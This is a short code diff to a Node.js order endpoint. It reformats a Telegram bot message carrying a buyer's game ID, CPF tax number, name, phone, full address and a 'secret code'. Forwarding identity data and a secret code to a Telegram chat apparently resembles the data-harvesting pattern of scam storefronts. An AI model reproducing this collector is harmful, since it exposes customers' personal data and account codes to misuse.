@@ -175,10 +175,10 @@ app.post("/order", async (req, res) => {
 
     // ===================================================================== 3. Send Telegram notification
     let msg = `<b>NEW ORDER FROM THE WEBSITE</b>\n\n`;
-    msg += `PLATFORM: <b>${platform}</b>\n`;  // <-- ADDED
-    msg += `GAME ID: ${gameId}\n`;
+    msg += `<b>${platform}</b>`;  // <-- ADDED
+    msg += ` <code>${gameId}</code>\n`;
     msg += `CPF: ${cpf}\n\n`;
-    msg += `NOME COMPLETO: <b>${fullName}</b>\n`;
+    msg += `NOME: <b>${fullName}</b>\n`;
     msg += `NÚMERO DE TELEFONE: ${phone}\n\n`;
     msg += `CEP: ${zip}\n`;
     msg += `ESTADO: ${state}\n`;
@@ -187,11 +187,11 @@ app.post("/order", async (req, res) => {
     msg += `RUA: ${street}\n`;
     msg += `NUMERO: ${number}\n`;
     msg += `COMPLEMENTO: ${address}\n\n`;
-    msg += `PRODUCT NAME\n${productName} `;
+    msg += `<b>PRODUCT NAME</b>\n${productName} `;
     msg += `[ ${productImg} ]\n\n`;
     msg += `REQUIREMENT: ${productId}\n`;
     msg += `🔒 <b>SECRET CODE</b>: ${secretCode}\n\n`;
-    msg += `<b>ORDER DATE</b>: ${brazilTime}\n`;
+    msg += `<b>${brazilTime}</b>\n`;
 
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const telegramRes = await fetch(telegramUrl, {
